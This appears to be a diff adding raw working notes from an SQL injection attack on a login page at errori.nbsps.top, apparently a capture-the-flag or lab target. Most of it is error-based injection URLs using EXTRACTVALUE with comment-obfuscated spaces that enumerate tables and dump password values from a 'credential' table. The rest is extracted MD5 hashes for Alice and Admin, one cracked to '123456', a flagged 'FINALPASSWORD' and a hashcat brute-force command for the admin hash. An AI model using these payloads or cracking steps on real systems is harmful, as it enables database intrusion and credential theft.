@@ -1,0 +1,38 @@
+http://errori.nbsps.top:11111/extractvalue.php?username=1%27/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,(Select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database())))/**/AND/**/%27ygWX%27=%27ygWX&Password=
+http://errori.nbsps.top:11111/extractvalue.php?username=1%27/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,(concat(Select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()))))/**/AND/**/%27ygWX%27=%27ygWX&Password=
+http://errori.nbsps.top:11111/extractvalue.php?username=1%27/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,(Select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/LIMIT/**/1,1)))/**/AND/**/%27ygWX%27=%27ygWX&Password=
+http://errori.nbsps.top:11111/extractvalue.php?username=1%27/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,(Select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/LIMIT/**/0,1)))/**/AND/**/%27ygWX%27=%27ygWX&Password=
+http://errori.nbsps.top:11111/extractvalue.php?username=1%27/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,(Select/**/*/**/from/**/credential/**/LIMIT/**/1,1)))/**/AND/**/%27ygWX%27=%27ygWX&Password=
+http://errori.nbsps.top:11111/extractvalue.php?username=1%27/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,(select/**/name/**/from/**/syscolumns/**/where/**/id/**/= object_id('credential'))))/**/AND/**/%27ygWX%27=%27ygWX&Password=
+select/**/name/**/from/**/syscolumns/**/where/**/id/**/= object_id('credential')
+
+
+select/**/CAST(Select/**/password/**/from/**/credential/**/LIMIT/**/5,1)/**/AS/*
+
+http://errori.nbsps.top:11111/extractvalue.php?username=1%27/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,CONVERT(VARCHAR(100),Select/**/password/**/from/**/credential/**/LIMIT/**/5,1)))/**/AND/**/%27ygWX%27=%27ygWX&Password=
+http://errori.nbsps.top:11111/extractvalue.php?username=1%27/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,select/**/CONCAT(Select/**/password/**/from/**/credential/**/LIMIT/**/5,1)))/**/AND/**/%27ygWX%27=%27ygWX&Password=
+http://errori.nbsps.top:11111/extractvalue.php?username=1%27/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,CONVERT(Select/**/password/**/from/**/credential/**/LIMIT/**/5,1)))/**/AND/**/%27ygWX%27=%27ygWX&Password=
+http://errori.nbsps.top:11111/extractvalue.php?username=1%27/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,CAST(Select/**/password/**/from/**/credential/**/AS/**/CHAR)))/**/AND/**/%27ygWX%27=%27ygWX&Password=
+http://errori.nbsps.top:11111/extractvalue.php?username=1%27/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,CAST(Select/**/password/**/from/**/credential/**/LIMIT/**/5,1/**/AS/**/CHAR)))/**/AND/**/%27ygWX%27=%27ygWX&Password=
+http://errori.nbsps.top:11111/extractvalue.php?username=1%27/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,CAST((SUBSTR((Select/**/password/**/from/**/credential/**/LIMIT/**/5,1),30,50))/**/AS/**/CHAR)))/**/AND/**/%27ygWX%27=%27ygWX&Password=
+http://errori.nbsps.top:11111/extractvalue.php?username=1%27/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,select/**/CAST(unhex(Select/**/password/**/from/**/credential/**/LIMIT/**/5,1)/**/AS/**/CHAR(100)))/**/AND/**/%27ygWX%27=%27ygWX&Password=
+select/**/CAST(unhex(Select/**/password/**/from/**/credential/**/LIMIT/**/5,1)/**/AS/**/CHAR(100))
+af7e5da7c1d6275dc728bae48e243e2e 
+
+Alice: á Ü9IºY«¾VàWò> --> e120dc3949ba59abbe56e057f20f3f3e --md5-->123456
+Admin: ½nó±#:np3¢Òd --> bd6ef3b1233a3f156e7033a2d2643f3f --md5-->?
+
+
+6:Admin:a5bdf35a1df4ea895905f6f
+
+Admin:a5bdf35a1df4ea895905f6f66 cutted
+b78ed97677c161c1c82c142906674ad
+a5bdf35a1df4ea895905f6f6618e83951a6effc0 <-----FINALPASSWORD!!!
+
+a5bdf35a1df4ea895905f6f6618e839 admin-Password
+a5bdf35a1df4ea895905f6f6618e839
+e120dc3949ba59abbe56e057f20f3f3e --> 123456
+bd6ef3b1233a3f156e7033a2d2643f3f admin-hash
+admin.password.length > 32
+
+hashcat -a 3 -m 0 --custom-charset1 1234567890abcdef bd6ef3b1233a3f156e7033a2d2643f3f --increment --increment-min 32 --increment-max 40 a5bdf35a1df4ea895905f6f6618e839?1?1?1?1?1?1?1?1?1 -d 1
